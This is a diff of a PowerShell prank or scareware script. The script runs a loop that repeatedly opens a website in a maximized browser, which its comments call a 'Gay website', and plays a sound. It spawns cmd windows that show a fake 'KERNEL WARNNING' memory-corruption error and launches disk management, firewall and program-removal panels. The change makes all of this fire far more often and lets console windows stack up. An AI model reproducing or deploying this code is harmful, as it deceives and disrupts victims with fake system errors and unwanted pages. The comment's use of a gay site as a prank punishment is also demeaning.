@@ -139,14 +139,14 @@ For($i=1; $i -lt $MaxInteractions; $i++)
    #Delay time before playing sfx
    Start-Sleep -Milliseconds $DelayTime
 
-   If($i -Match '^(1|7|16|30|50|70|100)$')
+   If($i -Match '^(1|3|5|7|9|11|13|15|17|19|21|23|25|27|29|30|40|50|60|70|80|90|97|98|99|100)$')
    {
       #Open Gay website on default browser and play sfx sound
       Start-Process -WindowStyle Maximized "$UrlLink"|Out-Null
       $PlayWav.SoundLocation = "$WaveFile"
       $PlayWav.playsync();
    }
-   ElseIf($i -Match '^(13|19|40|60|80|90)$')
+   ElseIf($i -Match '^(2|4|6|8|10|12|14|16|18|20|22|24|26|28|30|40|50|60|70|80|90|97|98|99|100)$')
    {
       #Open Gay website on default browser and play sfx sound
       Start-Process -WindowStyle Maximized "$UriLink"|Out-Null
@@ -157,19 +157,19 @@ For($i=1; $i -lt $MaxInteractions; $i++)
    $MsgBoxTitle = "KERNEL WARNNING 00xf340d0.421"
    $MsgBoxText = "Kernel: Critical Error 00xf340d0.421 Memory Corruption!"
    #Spawn cmd terminal console and make it look like one kernel error as ocurr
-   Start-Process cmd.exe -argumentlist "/c color 90&title $MsgBoxTitle&echo $MsgBoxText&Pause" -Wait
+   Start-Process cmd.exe -argumentlist "/c color 90&title $MsgBoxTitle&echo $MsgBoxText&Pause"
 
-   If($i -Match '^(8|12|45)$')
+   If($i -Match '^(3|7|12|16|18|20|30|40|50|60|70|80|90|97|98|99|100)$')
    {
       #Open drive manager
       Start-Process diskmgmt.msc
    }
-   ElseIf($i -Match '^(16|65|75)$')
+   ElseIf($i -Match '^(5|9|14|17|19|21|30|40|50|60|70|80|90|97|98|99|100)$')
    {
       #Open firewall manager
       Start-Process firewall.cpl
    }
-   ElseIf($i -Match '^(18|85|95)$')
+   ElseIf($i -Match '^(6|8|13|15|20|22|23|24|30|40|50|60|70|80|90|97|98|99|100)$')
    {
       #Open programs manager
       Start-Process appwiz.cpl
